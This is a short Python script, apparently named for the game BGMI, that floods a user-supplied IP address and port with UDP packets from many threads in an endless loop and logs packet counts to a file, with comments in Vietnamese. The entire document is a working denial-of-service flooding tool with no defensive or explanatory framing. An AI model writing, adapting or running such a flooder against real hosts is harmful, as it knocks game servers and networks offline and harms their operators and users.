#!/usr/bin/env python3
import sys, socket, threading, time

if len(sys.argv) < 5:
    print("Usage: python3 bgmi.py <IP> <PORT> <PACKET_SIZE> <THREADS>")
    sys.exit(1)

IP = sys.argv[1]
PORT = int(sys.argv[2])
PACKET_SIZE = int(sys.argv[3])
NUM_THREADS = int(sys.argv[4])

data = bytearray(PACKET_SIZE)  # dữ liệu gửi
stop_flag = [False]             # cờ dừng

def spam(thread_id):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent_count = 0
    while not stop_flag[0]:
        try:
            s.sendto(data, (IP, PORT))
            sent_count += 1
            if sent_count % 100 == 0:
                # ghi log vào tệp bgmi_log.txt
                with open("bgmi_log.txt", "a") as f:
                    f.write(f"Thread {thread_id}: Sent {sent_count} packets to {IP}:{PORT}\n")
        except Exception:
            pass

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=spam, args=(i,))
    t.start()
    threads.append(t)

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    stop_flag[0] = True
    print("Stopped by user")
